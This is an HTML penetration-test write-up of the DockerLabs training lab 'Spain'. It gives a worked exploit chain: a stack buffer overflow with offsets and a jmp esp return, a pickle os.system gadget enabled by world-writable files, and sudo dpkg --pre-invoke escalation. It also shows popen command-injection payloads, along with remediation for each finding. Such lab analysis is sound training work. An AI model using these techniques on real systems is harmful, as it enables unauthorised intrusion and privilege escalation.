@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 148 Spain &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; Spain</p><h1 id="spain--dockerlabs-lab-id-148-difícil">SPAIN — DockerLabs lab (id 148, &quot;Difícil&quot;)</h1>
+<blockquote>
+<p>Lab description from the catalogue: <em>&quot;Laboratorio para practicar la explotación de un
+Buffer Overflow para el acceso inicial, deserialización insegura con pickle&quot;</em>.</p>
+<p><strong>The description turned out to be accurate</strong>, which makes it the first lab in this
+pilot where the name/description matched the stack. Both advertised classes were
+really present, and both were used in the chain. It is still worth stating why that
+is a result and not a prior: §&quot;What the description got wrong&quot; below records the
+three concrete mismatches that a <code>-p-</code> scan and a source read settled.</p>
+</blockquote>
+<p><strong>Outcome: solved — 3-hop chain to a fourth identity, <code>darksblack</code>. No reward artifact
+exists in the image.</strong> See §9 for the evidence of absence.</p>
+<hr />
+<h2 id="1-surface">1. Surface</h2>
+<p>Deployment: <code>docker load</code> of an OCI-layout tar (<code>blobs/sha256/…</code> + <code>manifest.json</code>),
+run as <code>/usr/local/script/run.sh</code>.</p>
+<h3 id="11-recon-literal">1.1 Recon (literal)</h3>
+<pre><code>$ nmap -sV -Pn -p- [net-0-7]
+
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+80/tcp   open  http        Apache httpd 2.4.62
+9000/tcp open  cslistener?
+</code></pre>
+<p>Three ports. <strong>9000 is in neither the name nor the description</strong>, and it is the whole
+first stage. <code>nmap</code> guessed <code>cslistener?</code> because nothing in its DB matches a raw
+<code>accept()</code> loop — the service is not a known protocol, which is itself the signal to
+read the strings.</p>
+<p>Port 9000 belongs to <code>/var/www/html/.archivos-secretos/bitlock</code>:</p>
+<pre><code>$ strings -a bitlock | grep -i esper
+Esperando conexiones en el puerto 9000...
+</code></pre>
+<h3 id="12-identities-and-services">1.2 Identities and services</h3>
+<p><code>/etc/passwd</code> (relevant lines):</p>
+<pre><code>root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+maci:x:1001:1001:,,,:[lab-home]/maci:/bin/bash
+darksblack:x:1002:1002::[lab-home]/darksblack:/bin/rbash
+</code></pre>
+<p><code>/etc/sudoers</code> — the entire attack surface in two lines:</p>
+<pre><code>www-data ALL=(maci) NOPASSWD: /bin/python3 [lab-home]/maci/.time_seri/time.py
+maci ALL=(darksblack) NOPASSWD: /usr/bin/dpkg
+</code></pre>
+<p><code>/usr/local/script/run.sh</code>:</p>
+<pre><code class="language-bash">service apache2 start
+service ssh start
+sudo -u www-data /var/www/script.sh &amp;
+</code></pre>
+<p><code>/var/www/script.sh</code> supervises the target binary in a 2-second loop, restarting it if
+it dies — which is why the overflow is repeatable and why a crash never reads as a
+permanent loss of the service:</p>
+<pre><code class="language-bash">ruta=&quot;/var/www/html/.archivos-secretos/bitlock&quot;
+$ruta &amp;
+while true; do
+      if [[ $(ps aux |grep -v grep |grep bitlock |awk '{ print $11 }') == &quot;$ruta&quot; ]]; then
+             echo 'se esta ejecutando el binario' &gt;&gt; /tmp/logs.log
+      else
+             echo 'se a detenido el programa!, volviendo a ejecutar' &gt;&gt; /tmp/logs.log
+             $ruta &amp;
+      fi
+      sleep 2
+done
+</code></pre>
+<h3 id="13-web-application">1.3 Web application</h3>
+<p>Virtual host required — Apache 301s to a hostname otherwise:</p>
+<pre><code>$ curl -i http://[net-0-7]/manager.php
+HTTP/1.1 301 Moved Permanently
+Location: http://spainmerides.dlmanager.php
+</code></pre>
+<pre><code>$ curl -H 'Host: spainmerides.dl' http://[net-0-7]/manager.php
+    &lt;td&gt;bitlock&lt;/td&gt;
+    &lt;td&gt;&lt;a href=&quot;.archivos-secretos/bitlock&quot; download&gt;Descargar&lt;/a&gt;&lt;/td&gt;
+</code></pre>
+<p>Three PHP files. <code>index.php</code> and <code>efemerides.php</code> are static Spanish-history pages with
+no input. <code>manager.php</code> is the only dynamic page, and it has no authentication of any
+kind.</p>
+<h3 id="14-binaries">1.4 Binaries</h3>
+<p>All three are 32-bit i386, dynamically linked, <strong>not stripped</strong>, and all three share an
+identical mitigation profile:</p>
+<table>
+<thead>
+<tr>
+<th>Binary</th>
+<th>Owner</th>
+<th>Type</th>
+<th>PIE</th>
+<th>NX</th>
+<th>Canary</th>
+<th>RELRO</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>bitlock</code></td>
+<td><code>www-data</code></td>
+<td>ELF32 i386 EXEC</td>
+<td><strong>no</strong></td>
+<td><strong>disabled</strong></td>
+<td><strong>no</strong></td>
+<td>partial</td>
+</tr>
+<tr>
+<td><code>Olympus</code></td>
+<td><code>darksblack</code></td>
+<td>ELF32 i386 EXEC</td>
+<td>no</td>
+<td>disabled</td>
+<td>no</td>
+<td>partial</td>
+</tr>
+<tr>
+<td><code>OlympusValidator</code></td>
+<td><code>darksblack</code></td>
+<td>ELF32 i386 EXEC</td>
+<td>no</td>
+<td>disabled</td>
+<td>no</td>
+<td>partial</td>
+</tr>
+</tbody>
+</table>
+<p>Literal evidence — <code>readelf -hW</code> type and <code>GNU_STACK</code> flags:</p>
+<pre><code>===== bitlock =====
+  Type:                              EXEC (Executable file)
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
+</code></pre>
+<p><code>RWE</code> on <code>GNU_STACK</code> is NX disabled. <code>EXEC</code> is PIE disabled. No <code>__stack_chk_fail</code>
+import in any of the three, so no stack canary. This is a deliberately weaponised
+training target, not a misconfiguration.</p>
+<hr />
+<h2 id="2-what-the-description-got-wrong">2. What the description got wrong</h2>
+<p>Recording this because the pilot's standing lesson is that the name is a label, and
+because three of these are non-obvious enough to have cost time.</p>
+<ol>
+<li>
+<p><strong>Port 9000 is undisclosed.</strong> The description implies the buffer overflow is reached
+through the web application. It is not: it is a raw TCP service, and the only hint
+that it exists is a full port scan.</p>
+</li>
+<li>
+<p><strong>The binary is handed to you, unauthenticated.</strong> <code>manager.php</code> links
+<code>.archivos-secretos/bitlock</code> with a <code>download</code> attribute and Apache serves it. The
+exploit target is a published artefact — you never need to guess its location, and
+you never need to fuzz. Verified byte-identical to the copy extracted from the image:</p>
+<pre><code>$ curl -H 'Host: spainmerides.dl' -o dl http://[net-0-7]/.archivos-secretos/bitlock
+$ md5sum dl
+d3062602c6b98aa445da7b6122d27c47  dl
+</code></pre>
+<p>(matches the image's own <code>md5sum /var/www/html/.archivos-secretos/bitlock</code>.)</p>
+</li>
+<li>
+<p><strong>&quot;Insecure deserialization with pickle&quot; is gated off by default, and the gate is
+world-writable.</strong> <code>time.conf</code> ships <code>serial=off</code>, so the advertised pickle primitive
+does nothing out of the box. The description does not mention the gate, and the gate
+is the interesting part.</p>
+</li>
+</ol>
+<hr />
+<h2 id="3-findings">3. Findings</h2>
+<h3 id="f-01--unauthenticated-stack-based-buffer-overflow-rce-as-www-data-cwe-787-cwe-121">F-01 — Unauthenticated stack-based buffer overflow, RCE as <code>www-data</code> (CWE-787, CWE-121)</h3>
+<p><strong>Where.</strong> <code>/var/www/html/.archivos-secretos/bitlock</code>, <code>tcp/9000</code>.</p>
+<p><strong>Evidence — the sink, from the disassembly.</strong> <code>main</code> reads up to 1024 bytes and passes
+the buffer to a handler that <code>strcpy</code>s it into an 18-byte stack buffer:</p>
+<pre><code>08049267 &lt;hald&gt;:
+ 8049268:	mov    ebp,esp
+ 804927b:	push   DWORD PTR [ebp+0x8]     ; src = attacker-controlled buffer
+ 804927e:	lea    edx,[ebp-0x12]          ; dst = 18-byte stack buffer
+ 8049281:	push   edx
+ 8049284:	call   80490a0 &lt;strcpy@plt&gt;    ; &lt;-- unbounded copy
+ 8049290:	leave
+ 8049291:	ret
+</code></pre>
+<pre><code> 8049422:	push   0x400                    ; count = 1024
+ 8049427:	lea    eax,[ebp-0x43c]          ; src = 1024-byte read buffer
+ 8049431:	call   8049050 &lt;read@plt&gt;
+ 804946c:	call   8049267 &lt;hald&gt;
+</code></pre>
+<p><strong>Offset to EIP: 22.</strong> 18 bytes of buffer (<code>ebp-0x12</code>..<code>ebp-0x1</code>), 4 bytes of saved EBP,
+then the return address.</p>
+<p><strong>Exploit.</strong> NX is disabled, so shellcode runs from the stack. <code>jmp esp</code> is present and —
+usefully — <em>named in the symbol table</em> as the last two bytes of <code>.text</code>:</p>
+<pre><code> 804948a:	ret
+
+0804948b &lt;jmp_esp&gt;:
+ 804948b:	jmp    esp
+</code></pre>
+<p>Payload: 22 bytes padding + <code>0x0804948b</code> + 2 alignment bytes + 67-byte shellcode
+(<code>dup2(4,0/1/2)</code> then <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>) + a trailing NUL — <strong>96 bytes
+total</strong>.</p>
+<p><strong>Impact — the identity is the finding.</strong> Per <code>decision-making.md</code> §8, <code>id</code> was the first
+command inside the new primitive:</p>
+<pre><code>$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ whoami
+www-data
+$ hostname
+1f05d752cd19
+$ uname -a
+Linux 1f05d752cd19 7.0.0-34-generic #34-Ubuntu SMP PREEMPT_DYNAMIC Wed Sep  2 14:29:37 UTC 2026 x86_64 GNU/Linux
+</code></pre>
+<p><strong>Not root.</strong> The advertised &quot;access inicial&quot; is a <code>www-data</code> shell, so every other
+injection in this web root is one request from a full application compromise, and the
+chain continues through <code>sudo</code>, not through privilege escalation.</p>
+<p><strong>Root cause.</strong> <code>strcpy</code> of network input into a fixed 18-byte stack buffer in a binary
+compiled with every mitigation off. The fix is not &quot;be careful with strcpy&quot;: it is
+<code>-fstack-protector-strong</code>, <code>-D_FORTIFY_SOURCE=2</code>, PIE, and NX, none of which are
+present. Reachability is the bug — the service is bound to <code>0.0.0.0</code> with no
+authentication and no <code>SO_REUSEADDR</code>-style gate, so any host that can route to 9000
+owns the process.</p>
+<h3 id="f-02--unauthenticated-file-manager-discloses-the-exploit-target-cwe-306-cwe-548">F-02 — Unauthenticated file manager discloses the exploit target (CWE-306, CWE-548)</h3>
+<p><strong>Evidence.</strong></p>
+<pre><code>$ curl -H 'Host: spainmerides.dl' -D - -o /tmp/dl \
+      http://[net-0-7]/.archivos-secretos/bitlock
+HTTP/1.1 200 OK
+Server: Apache/2.4.62 (Debian)
+Last-Modified: Mon, 23 Dec 2024 10:19:11 GMT
+ETag: &quot;3be0-629ed53d945c0&quot;
+Content-Length: 15328
+</code></pre>
+<p><code>manager.php</code> performs <code>scandir()</code> on <code>.archivos-secretos</code> and emits a download link per
+entry, with no <code>session_start()</code>, no <code>$_SESSION</code> check, and no <code>require</code> of any auth
+module. It renders filenames through <code>htmlspecialchars()</code> — the output encoding is
+correct, and the authorisation is entirely absent, which is the more useful distinction:
+this is not an XSS, it is a missing gate.</p>
+<p><strong>Impact.</strong> Independent of the chain: it publishes the exact binary, at the exact path,
+with a stable <code>ETag</code>, to any anonymous client. That converts &quot;find the vulnerable
+service&quot; into one GET. On a real target this is also a full directory listing of a
+dot-directory, which the author clearly intended to be hidden — <code>.archivos-secretos</code> is
+served at all only because Apache's default does not exclude dotfiles from an explicit
+URL.</p>
+<p><strong>Root cause.</strong> A file-browsing route shipped with no authorisation, and a web server
+with no <code>&lt;Location&gt;</code> deny for the hidden directory. Remediation: put the route behind the
+same auth as the rest of the admin surface, and <code>&lt;LocationMatch&gt;</code>-deny dot-directories.</p>
+<h3 id="f-03--world-writable-pickle-file--world-writable-gate-config--rce-as-maci-cwe-732-cwe-502">F-03 — World-writable pickle file + world-writable gate config → RCE as <code>maci</code> (CWE-732, CWE-502)</h3>
+<p><strong>The interpreter.</strong> <code>[lab-home]/maci/.time_seri/time.py</code> (world-writable, mode 666):</p>
+<pre><code class="language-python">import pickle
+import os
+file_path = &quot;/opt/data.pk1&quot;
+config_file_path = &quot;[lab-home]/maci/.time_seri/time.conf&quot;
+...
+        with open(file_path, 'rb') as f:
+            data = pickle.load(f)
+...
+def is_serial_enabled(config_file_path):
+    ...
+        if line.startswith('serial='):
+            value = line.split('=')[1].strip()
+            return value.lower() == 'on'
+</code></pre>
+<p><code>pickle.load()</code> on a file any local user can write, with no allowlist, no
+<code>find_class</code> override, and no signature.</p>
+<p><strong>Permissions (the actual mechanism):</strong></p>
+<pre><code>-rw-rw-rw- 1 root  root   143  /opt/data.pk1
+-rw-r--rw- 1 maci  maci    11  [lab-home]/maci/.time_seri/time.conf
+</code></pre>
+<p><strong>The gadget chain.</strong> <code>pickle</code> is a bytecode interpreter, not a data format. To rebuild
+an object the unpickler evaluates <code>GLOBAL</code> opcodes through
+<code>pickle.Unpickler.find_class(module, name)</code>, which does <code>__import__(module)</code> and then
+<code>getattr</code>. So the question is never &quot;how malicious is the payload&quot; — it is <strong>which
+callables are reachable by name in this interpreter</strong>.</p>
+<p>Gadget used: <code>(os.system, (&quot;&lt;cmd&gt;&quot;,))</code> via <code>__reduce__</code>. The 69-byte payload decodes to:</p>
+<pre><code>cosix
+system
+p0
+(Vid &gt; /tmp/spain_pickle_proof.txt 2&gt;&amp;1
+p1
+tp2
+Rp3
+.
+</code></pre>
+<p><code>os</code> is already in <code>sys.modules</code> because <code>time.py</code> itself does <code>import os</code>, and
+<code>find_class</code> would import it regardless — so <strong>no third-party package and no interpreter
+flag is required; a bare CPython suffices.</strong> <code>os.system</code> is the cheapest reachable
+gadget, which is exactly why it is the first one to try, and its output is discarded by
+<code>time.py</code> (the <code>print(data)</code> is commented out), so a file or socket side effect is the
+only observable.</p>
+<p><strong>Why it is reachable: the gate is voided by its own permissions.</strong> <code>serial=off</code> ships as
+the default and genuinely blocks the primitive — proven differentially in §5. But the
+file carrying the setting is mode <code>666</code>, so <code>www-data</code> flips it:</p>
+<pre><code>$ echo 'serial=on' &gt; [lab-home]/maci/.time_seri/time.conf
+$ echo '&lt;base64 pickle&gt;' | base64 -d &gt; /opt/data.pk1
+$ sudo -n -u maci /bin/python3 [lab-home]/maci/.time_seri/time.py
+Datos deserializados correctamente, puedes revisar /tmp
+$ cat /tmp/spain_pickle_proof.txt
+uid=1001(maci) gid=1001(maci) groups=1001(maci),100(users)
+</code></pre>
+<p><strong>Impact.</strong> Code execution as <code>maci</code>. Note the extra group: <code>maci</code> is in group <code>100 (users)</code>, which is what makes it useful as a sudo principal rather than a dead end.</p>
+<p><strong>Root cause.</strong> Three independent defects that each alone would have blocked the chain:
+(a) <code>pickle.load</code> on attacker-writable input with no class allowlist — the security
+control for <code>pickle</code> is <code>find_class</code> overriding or a signed format, and neither exists;
+(b) the pickle file is mode <code>666</code>; (c) the <em>configuration</em> that gates the deserialiser is
+mode <code>666</code>. Fix (a) primarily; (b) and (c) are <code>0644 root:root</code>.</p>
+<h3 id="f-04--sudo-rule-on-a-program-that-executes-its-own-arguments-rce-as-darksblack-cwe-269">F-04 — <code>sudo</code> rule on a program that executes its own arguments: RCE as <code>darksblack</code> (CWE-269)</h3>
+<p><strong>The rule:</strong> <code>maci ALL=(darksblack) NOPASSWD: /usr/bin/dpkg</code>.</p>
+<p><code>sudo</code> pins the <em>program</em> and its version of an interpreter — here <code>/usr/bin/dpkg</code>. The
+mistake is that <code>dpkg</code> is not a leaf: it accepts <code>--pre-invoke=&lt;command&gt;</code> and dispatches
+it to a shell <strong>before</strong> it performs its own privilege check.</p>
+<pre><code>$ dpkg --help | grep -iE 'pre-invoke|post-invoke'
+  --pre-invoke=&lt;command&gt;     Set a pre-invoke hook.
+  --post-invoke=&lt;command&gt;    Set a post-invoke hook.
+</code></pre>
+<p>So an operation that needs no privileges at all still runs the hook as the target user,
+and <em>then</em> fails:</p>
+<pre><code>$ sudo -n -u darksblack /usr/bin/dpkg \
+      --pre-invoke='id &gt; /tmp/dbg_hook.txt 2&gt;&amp;1' --unpack /tmp/spainprobe.deb
+dpkg: error: requested operation requires superuser privilege
+$ cat /tmp/dbg_hook.txt
+uid=1002(darksblack) gid=1002(darksblack) groups=1002(darksblack)
+</code></pre>
+<p><strong>Two constraints that cost cycles and are worth writing down:</strong></p>
+<ul>
+<li><code>dpkg</code> splits <code>--pre-invoke</code> on <code>;</code>. A <code>{ a; b; }</code> group is shredded into separate
+hooks and the run &quot;succeeds&quot; while producing no output — which is indistinguishable
+from a chain that stopped short. The hook value must be a single simple command;
+put logic in a script and pass its path.</li>
+<li><code>/tmp</code> is sticky and a file <code>maci</code> created is mode <code>0644</code>, so <code>darksblack</code> <strong>cannot
+overwrite it</strong>. Reusing one output path silently returned <code>maci</code>'s earlier output.
+This one is nasty: the stale file is a <em>plausible</em> answer, not an error, so the
+reported identity was one step behind the real one until a unique path was used.</li>
+</ul>
+<p><strong>Impact.</strong> Code execution as <code>darksblack</code>, and with it the only content in
+<code>[lab-home]/darksblack</code> (mode <code>750</code>, unreadable by <code>www-data</code> and <code>maci</code>).</p>
+<p><strong>Root cause.</strong> The sudo rule names a program that is itself a command interpreter over
+its own argument vector. <code>sudo</code> cannot express &quot;this program, but not its
+<code>--pre-invoke</code>&quot;. The remediation is to drop the rule; where a package tool is genuinely
+required, wrap it in a root-owned script that passes a fixed argument list.</p>
+<h3 id="f-05--os-command-injection-in-olympus-via-popen-cwe-78">F-05 — OS command injection in <code>Olympus</code> via <code>popen()</code> (CWE-78)</h3>
+<p><strong>Not used by the chain</strong> — it grants nothing beyond <code>darksblack</code>, which F-04 already
+reaches. Reported because it is real and independently exploitable by any account that
+can execute the binary.</p>
+<p><code>main</code> in <code>[lab-home]/darksblack/Olympus</code>:</p>
+<pre><code> 804923f:	lea    eax,[ebp-0x74]           ; serial buffer
+ 804924a:	call   __isoc99_scanf@plt        ; scanf(&quot;%s&quot;, serial) -- ONE token
+ 8049262:	lea    eax,[ebp-0x178]          ; command buffer
+ 804925d:	push   0x96                      ; size
+ 8049269:	call   snprintf@plt              ; &quot;.../OlympusValidator %s&quot;, serial
+ 8049282:	call   popen@plt                 ; popen() -&gt; /bin/sh -c
+</code></pre>
+<p>The serial is interpolated into a command string that <code>popen()</code> hands to <code>/bin/sh -c</code>.
+Because <code>scanf(&quot;%s&quot;)</code> reads a <strong>single whitespace-delimited token</strong>, <code>; id</code> is truncated
+to <code>;</code> and does nothing — the payload has to be one space-free token, which <code>$( )</code> and
+backticks both are:</p>
+<pre><code>$ printf '2\n$(id&gt;/tmp/spain_inject.txt)\n' | ./Olympus
+Selecciona el modo:
+1. Invitado
+2. Administrador
+Introduce el serial: Serial invalido, vuelve a intentar
+$ cat /tmp/spain_inject.txt
+uid=1002(darksblack) gid=1002(darksblack) groups=1002(darksblack)
+
+$ printf '2\n`whoami&gt;/tmp/spain_inject2.txt`\n' | ./Olympus &gt;/dev/null 2&gt;&amp;1
+$ cat /tmp/spain_inject2.txt
+darksblack
+</code></pre>
+<p><strong>Root cause.</strong> Untrusted input into a shell command line. Fix: <code>execve</code> the validator
+directly, or pass the serial as an <code>argv</code> element and never build a command string.</p>
+<h3 id="f-06--the-serial-gate-protects-nothing-cwe-285--cwe-863">F-06 — The serial gate protects nothing (CWE-285 / CWE-863)</h3>
+<p><strong>A control that does not hold, which is a finding.</strong></p>
+<p><code>Olympus</code> gates its &quot;administrator&quot; mode behind a serial validated by
+<code>OlympusValidator</code>. The guest mode prints the identical task list with no credential at
+all:</p>
+<pre><code>$ printf '1\n' | ./Olympus
+Selecciona el modo:
+1. Invitado
+2. Administrador
+Bienvenido al modo invitado, aqui podras obtener la lista de tareas pendientes.
+1. Desarrollo website empresa: Tradeway Consulting CORP
+2. Prueba de Penetracion empresa: Tradeway Consulting CORP
+3. Securizar red corporativa en Tradeway Consulting CORP
+</code></pre>
+<p>The serial is decorative. The content is flavour text, so nothing is actually disclosed —
+but the gate's <em>purpose</em> (distinguish guest from admin) is not met by the code, and a
+reviewer reading the menu would reasonably conclude otherwise.</p>
+<h3 id="f-07--the-obfuscated-serial-is-derivable-from-the-shipped-binary-cwe-200--cwe-330">F-07 — The obfuscated serial is derivable from the shipped binary (CWE-200 / CWE-330)</h3>
+<p><code>OlympusValidator</code> contains the expected serial in obfuscated form and a <code>spoof</code>
+de-obfuscation routine; the same obfuscated literal appears in both binaries:</p>
+<pre><code>$ strings -a [lab-home]/darksblack/.zprofile/OlympusValidator | grep -A1 'Y\[\^'
+Y[^]
+jZjMjFjDj-j1jPjQjQj-j0jPjLjOj-j3jSjHjGj-j8j7j6jA
+</code></pre>
+<p>A client-side secret embedded in a distributed binary is not a secret. I did <strong>not</strong>
+spend time decoding it, because F-06 shows the gate protects nothing — the finding is the
+embedding, not the recovered value.</p>
+<h3 id="f-08--darksblack-is-a-terminal-identity-and-that-is-a-finding">F-08 — <code>darksblack</code> is a terminal identity, and that is a finding</h3>
+<p><code>darksblack</code> has no further privilege path, verified rather than assumed:</p>
+<pre><code>$ sudo -n -l
+sudo: a password is required
+</code></pre>
+<p>No sudo rules, and no SUID binary beyond the distribution defaults
+(<code>passwd</code>, <code>su</code>, <code>mount</code>, <code>sudo</code>, <code>ssh-keysign</code>, <code>unix_chkpwd</code>). <code>/root</code> is unreadable
+(<code>drwx------</code>). So the chain is 3 hops and stops. <strong>A chain that took exactly the number
+of hops the design implies, with every boundary intact, is evidence the controls held</strong>
+(<code>decision-making.md</code> §8).</p>
+<h3 id="f-09--anti-forensics-bash_history-symlinked-to-devnull">F-09 — Anti-forensics: <code>.bash_history</code> symlinked to <code>/dev/null</code></h3>
+<pre><code>lrwxrwxrwx 1 root root 9 Dec 26  2024 .bash_history -&gt; /dev/null
+</code></pre>
+<p>Root-owned, and it works: darksblack's history is genuinely suppressed. This is the
+control that held most cleanly in the lab, and it is worth reporting as a positive —
+while noting it is trivially bypassed by an attacker who plants their own history file
+before the first login, since <code>darksblack</code>'s home is writable by <code>darksblack</code>.</p>
+<hr />
+<h2 id="4-the-chain">4. The chain</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>From → To</th>
+<th>Mechanism</th>
+<th>Identity proof</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>anonymous → <code>www-data</code></td>
+<td>BOF in <code>bitlock</code> on <code>tcp/9000</code> (F-01)</td>
+<td><code>uid=33(www-data)</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>www-data</code> → <code>maci</code></td>
+<td><code>sudo -u maci python3 time.py</code> + pickle gadget (F-03)</td>
+<td><code>uid=1001(maci) gid=1001(maci) groups=1001(maci),100(users)</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>maci</code> → <code>darksblack</code></td>
+<td><code>sudo -u darksblack dpkg --pre-invoke=&lt;cmd&gt;</code> (F-04)</td>
+<td><code>uid=1002(darksblack) gid=1002(darksblack) groups=1002(darksblack)</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Why each hop is where it is, and not earlier or later:</strong></p>
+<ul>
+<li><strong>Hop 1 is <code>tcp/9000</code>, not the web tier.</strong> The web tier gives nothing: <code>index.php</code> and
+<code>efemerides.php</code> take no input, and <code>manager.php</code> (F-02) discloses the target rather
+than executing anything. The buffer overflow is reachable only through the undisclosed
+port, and it lands on <code>www-data</code> — not root — so it is a foothold, not the answer.</li>
+<li><strong>Hop 2 is the pickle, and only after the gate is flipped.</strong> Reaching <code>maci</code> looks
+available the moment you have <code>www-data</code>, because the sudo rule is right there in
+<code>/etc/sudoers</code>. But running <code>time.py</code> with the shipped config prints
+<code>La serialización está deshabilitada</code> and does nothing. The hop costs <em>two</em> writes, not
+one: flip the <code>666</code> config, then plant the <code>666</code> pickle. Reading the permissions rather
+than assuming them is what turned a dead end into a hop.</li>
+<li><strong>Hop 3 is <code>dpkg</code>, and the obvious use of it fails.</strong> <code>dpkg -i</code> refuses:
+<code>requested operation requires superuser privilege</code>. A <code>preinst</code> maintainer script in a
+crafted <code>.deb</code> — the standard &quot;sudo dpkg&quot; trick — therefore does not fire. The
+argument-injection route (<code>--pre-invoke</code>) does, because the hook is dispatched <em>before</em>
+the privilege check. So the escalation is not in dpkg's install path at all; it is in
+dpkg's argument parser.</li>
+<li><strong>The chain stops at <code>darksblack</code> because the deployment stops there</strong> (F-08), not
+because the tester stopped looking.</li>
+</ul>
+<h3 id="unused-findings-reported-not-used-in-the-chain">Unused findings (reported, not used in the chain)</h3>
+<p>F-02 (unauthenticated binary disclosure), F-05 (<code>popen</code> command injection), F-06
+(decorative serial gate), F-07 (embedded serial), F-09 (history suppression, a control
+that held).</p>
+<hr />
+<h2 id="5-control-tests">5. Control tests</h2>
+<p>Two controls in this lab are worth reporting with the same prominence as the bugs,
+because one held and one did not, and they are only distinguishable by a test.</p>
+<h3 id="c-01--the-serialoff-gate-works-differential-proof">C-01 — The <code>serial=off</code> gate <strong>works</strong> (differential proof)</h3>
+<p>Same malicious pickle, only the gate differs:</p>
+<pre><code>##### A: serial=off (shipped default) + malicious pickle #####
+    La serialización está deshabilitada. El programa no se ejecutará.
+    executed? NO
+
+##### B: serial=on + same malicious pickle #####
+    Datos deserializados correctamente, puedes revisar /tmp
+    executed? YES
+    CONTROL_PROOF
+</code></pre>
+<p>This is the point worth carrying forward: <strong>the control functioned correctly and is
+still void</strong>, because the file that carries the setting is mode <code>666</code>. A reviewer who
+tested only the gate would conclude the pickle path was closed. Reporting &quot;the control
+held&quot; without the differential would have been wrong, and so would reporting &quot;the pickle
+was exploitable out of the box&quot; without it.</p>
+<h3 id="c-02--homedarksblack-mode-750-held">C-02 — <code>[lab-home]/darksblack</code> mode <code>750</code> held</h3>
+<p><code>www-data</code> and <code>maci</code> both fail to traverse it, which is what forced hop 3 to go through
+<code>dpkg</code> rather than straight to <code>Olympus</code>:</p>
+<pre><code>$ ls -la [lab-home]/darksblack/
+ls: cannot open directory '[lab-home]/darksblack/': Permission denied
+</code></pre>
+<p>This is the control that makes the <code>dpkg</code> rule <em>necessary</em> rather than redundant.</p>
+<h3 id="c-03--darksblack-has-no-privilege-path-f-08">C-03 — <code>darksblack</code> has no privilege path (F-08)</h3>
+<p>Confirmed with <code>sudo -n -l</code> (password required) and a full SUID enumeration, not inferred
+from the absence of a rule in the file I read.</p>
+<hr />
+<h2 id="6-self-correction-prominent-because-this-run-had-four">6. Self-correction (prominent, because this run had four)</h2>
+<p>The first three were caught <strong>before</strong> the exploit was declared working; the fourth was
+caught only after a successful-looking run. All four share one shape: <strong>the failure was
+invisible from the client, and each looked like a dead target.</strong> Per
+<code>decision-making.md</code>, the check was shaped so that &quot;the interesting answer&quot; and &quot;the
+boring answer&quot; produced the same output.</p>
+<h3 id="61-jmp-esp-alignment--off-by-2-bytes">6.1 <code>jmp esp</code> alignment — off by 2 bytes</h3>
+<p><code>hald</code> ends <code>leave; ret</code>. <code>leave</code> is <code>mov esp,ebp; pop ebp</code>, so on entry to <code>jmp esp</code>,
+<strong>esp = ebp+8</strong> — four bytes past the saved return address (which occupies
+<code>ebp+4..ebp+7</code>), not at it. My first payload placed shellcode immediately after the
+return address, so <code>jmp esp</code> entered the stream 2 bytes off and desynchronised it.</p>
+<p><em>Symptom:</em> empty response, then <code>BrokenPipeError</code>.
+<em>Caught by:</em> a <strong>local self-test against a scratch copy</strong> of the binary on a patched port
+(9999), before touching the real service.</p>
+<h3 id="62-strcpy-truncates-at-the-first-nul">6.2 <code>strcpy</code> truncates at the first NUL</h3>
+<p><code>main</code> writes <code>buf[read_count] = 0x30</code> — the ASCII character <code>'0'</code>, <strong>not</strong> a NUL — so it
+does not terminate the string, and my shellcode contained NUL bytes inside
+<code>mov ecx,1</code> (<code>b9 01 00 00 00</code>) and <code>mov ebx,3</code> (<code>bb 03 00 00 00</code>). <code>strcpy</code> halted at
+the first of them, 21 bytes into the shellcode.</p>
+<p><em>Caught by:</em> <code>gdb</code>, which showed the exact bytes:</p>
+<pre><code>0xffed8d40:	0x01b903b3	0x00000000	0x00000000	0x41414141
+                                      ^^^^^^^^ my cd 80 replaced by stale stack
+</code></pre>
+<p>This is <code>decision-making.md</code>'s &quot;validate the value, not the representation&quot; applied to
+my own payload: a byte stream that <em>looked</em> right in a hex dump was a different program
+to the CPU.</p>
+<h3 id="63-inc-ecx-is-0x41-not-0x40--and-the-byte-level-test-passed-anyway">6.3 <code>inc ecx</code> is <code>0x41</code>, not <code>0x40</code> — and the byte-level test passed anyway</h3>
+<p>I emitted <code>0x40</code> for <code>inc ecx</code>. In 32-bit mode the one-byte INC encodings are <code>0x40+r</code>, so
+<code>0x40</code> is <code>inc eax</code>. Result: <code>ecx</code> stayed 0 and <code>eax</code> became <code>0x40</code> = 64 = <code>getppid</code>.
+My NUL-freeness assertion <strong>passed</strong>, and the payload still mis-executed:</p>
+<pre><code>   16:	41                   	inc    ecx      &lt;- what I meant
+    0:	31 c0                	xor    %eax,%eax
+   ...
+  804948d:  40                   	inc    %eax      &lt;- what I emitted
+</code></pre>
+<p><em>Caught by:</em> <code>gdb</code> disassembly of the live stack, cross-checked against <code>strace</code>, which
+showed <code>getppid()</code> where a <code>dup2</code> should have been. This is the strongest argument in the
+run for the methodology's evidence rule: <strong>the tool self-test validated the generator and
+still missed a semantic error.</strong> The fix was to make the self-test <em>decode</em> the bytes and
+assert syscall arguments, rather than trust my intent for an opcode.</p>
